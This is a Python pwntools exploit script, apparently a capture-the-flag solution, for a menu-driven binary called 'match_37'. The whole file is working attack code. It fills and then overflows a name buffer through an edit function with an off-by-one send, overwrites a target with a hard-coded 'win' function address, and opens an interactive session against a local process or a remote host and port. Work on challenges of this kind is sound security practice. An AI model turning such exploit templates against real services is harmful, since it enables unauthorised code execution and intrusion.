#!/usr/bin/env python
from pwn import *
import sys

context.terminal = ['tmux','splitw','-h']
context.log_level = 'debug'
gdb_bool = True
gdb_bool = False

win_addr = 0x40092C
catalog = 0x602280

def write(name):
	r.sendlineafter("> ", "1")
	r.sendlineafter("name: ",name)

def edit(index,name):
	r.sendlineafter("> ","2")
	r.sendlineafter("index: ",str(index))
	r.sendlineafter("name: ",name)

def edit_off(index,name):
	r.sendlineafter("> ","2")
	r.sendlineafter("index: ",str(index))
	r.sendafter("name: ",name)

def print_index(index):
	r.sendlineafter("> ","3")
	r.sendlineafter("index: ",index)



def exploit(r):
    write("A"*0x1f)
    edit_off(0,"B"*0x21)
    buf = "A"*(0x1f+9)
    buf += p32(win_addr)
    buf +="\x00"*8
    edit(0,buf)
    r.interactive()
    return


if __name__ == "__main__":
    log.info("For remote %s HOST PORT" % sys.argv[0])
    
    binary_name = "./match_37"        #put binary name here
    e = ELF(binary_name)

    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(binary_name)
        print util.proc.pidof(r)
        gdb_cmd = [
        	"b *0x400a0e",
        	"b *0x400BF0",
        	"b *0x400B71",
            "b *0x400A63",
            "c"


        ]
        if(gdb_bool):
            gdb.attach(r, gdbscript = "\n".join(gdb_cmd))
            #r =gdb.debug(binary_name, gdbscript = "\n".join(gdb_cmd))
        #r = process("./LOLgame", env={"LD_PRELOAD" : "./libc.so.6.remote"})
        #pause()
        exploit(r)

